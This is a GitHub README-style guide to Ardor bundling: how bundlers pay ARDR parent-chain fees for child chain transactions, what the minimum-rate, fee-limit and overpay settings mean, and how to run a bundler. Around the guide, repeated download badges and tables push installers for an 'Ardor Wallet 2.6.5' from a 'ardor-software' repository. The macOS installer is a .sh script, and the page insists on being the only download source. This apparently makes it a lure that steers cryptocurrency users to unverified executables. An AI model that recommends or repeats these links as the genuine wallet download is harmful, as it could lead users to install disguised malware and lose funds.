![Ardor Wallet guide](assets/banner-article.png)

# How Ardor bundling works, why child chain users skip ARDR, and how to run a bundler

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A bundler groups child chain transactions into a single parent chain transaction and pays the ARDR fee for the bundle. That is how a user can transact in Ignis or Nxt without holding ARDR: the child chain fee goes to the bundler, and the bundler pays the parent chain.

## What bundling is

Every [child chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) transaction has to be recorded somewhere that the network secures. Ardor's design records it on the parent chain, but not one transaction at a time: a bundler collects many child chain transactions, wraps them into one parent chain transaction, and pays the fee for that single wrapper.

The effect is economy of scale and a separation of concerns. The child chain user pays in the token they already hold; the bundler handles the parent chain's fee asset; the forger receives [ARDR](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md) and never needs to know which child chain the transactions came from.

## Why child chains need it

A child chain has no forgers of its own. It relies on the parent chain for security, and the parent chain charges in ARDR. Without a bundler, every child chain user would need ARDR just to move a token, which would defeat the purpose of having a separate [fee](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md) asset.

Bundling is therefore not an optional convenience; it is the mechanism that makes the child chain model usable. Remove it and the platform becomes a set of chains that all demand the same coin.

## What the options mean

| Option | What it does |
|---|---|
| Minimum rate | The lowest fee rate the bundler will accept. Transactions below it are ignored rather than rejected. |
| Fee limit | The most the bundler will pay on the parent chain for a bundle, which caps its exposure. |
| Overpay | How much above the required fee the bundler is willing to pay to get a bundle included sooner. |

These three settings decide whether a bundler is profitable and whether it is useful. A minimum rate set too high turns away custom, and a fee limit set too low leaves bundles waiting for a quiet moment that may not come.

## Running a bundler

1. Run a [node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) that follows the chain, because a bundler needs current state to build bundles.
2. Open the bundling controls in the wallet and enable the bundler role.
3. Set the minimum rate, the fee limit and the overpay to values that match your costs.
4. Choose which child chains to serve, since a bundler can accept more than one.
5. Leave the node running and watch the bundler's activity for the first day.
6. Adjust the minimum rate if bundles are either never accepted or never profitable.

Step six is the whole job in practice. The parameters are a market position, not a fixed configuration, and they need revisiting when activity changes.

## Who pays what

The child chain user pays a fee in the child chain's token. The bundler keeps that fee and pays ARDR on the parent chain. The forger receives the ARDR fee as part of the block.

Each party pays in the asset they hold and receives what they were providing. That is why the model works without anybody holding a second token, and why a bundler's margin is the difference between the fees it collects and the ARDR it spends.

## What goes wrong

The most common failure is a transaction that never appears: its fee was below the bundler's minimum, so no bundler picked it up. It is not rejected, it is ignored, and the wallet shows nothing until the deadline passes.

The second is a bundler that runs out of ARDR. It keeps accepting child chain fees it cannot turn into parent chain bundles, which looks like a working service until nothing confirms. Watching the ARDR balance is part of operating one.

## Why this matters to a normal user

If you only ever use a child chain, bundling is the reason you never had to buy ARDR, and the reason a transaction can sit unconfirmed even though your fee looked reasonable. Knowing the mechanism turns an unexplained wait into an obvious next step: raise the fee, or check whether any bundler is serving that chain.

If you run a node, bundling is an additional service you can offer. It does not require a second machine, and it turns idle infrastructure into something the network uses.

## Bundling is a fee market, not a subsidy

A bundler is not giving away the parent chain fee; it is buying child chain fees and selling inclusion. Its margin is the spread between what it collects and what it pays, which means a healthy bundler raises its minimum rate when the parent chain gets busy.

For a user, that is why the same transaction can confirm instantly one week and wait the next. The fee did not become wrong; the market moved beneath it, and the bundler adjusted.

## What a user should check first

When a child chain transaction does not appear, check three things in order: the fee against the chain's current minimum, whether any bundler is active for that chain, and whether the transaction was broadcast at all.

The third one catches light-client mode, which can produce a transaction the network never saw. The first two explain almost everything else, and neither requires any technical knowledge beyond reading the fee field.

## FAQ

### Do I need ARDR to use a child chain?

Not for the transaction itself: a bundler pays the parent chain fee. You need the child chain's token for the fee the bundler collects.

### What happens if no bundler picks up my transaction?

It stays unconfirmed until its deadline and then expires. Raise the fee, or check which bundlers are active for that chain.

### Can one bundler serve several child chains?

Yes. A bundler can accept transactions from more than one child chain, with the same settings applied per chain.

### Is running a bundler profitable?

It is a margin business: the child chain fees collected minus the ARDR spent. Profitability depends on your settings and on the chain's activity, not on a fixed rate.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Ardor child chains explained, including one passphrase for all](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md)
- [Why an Ardor transaction stays unconfirmed](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md)
- [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md)
- [Trade on the Ardor coin exchange](https://github.com/ardor-software/ardor-platform-guides/blob/main/trade-on-the-ardor-coin-exchange.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
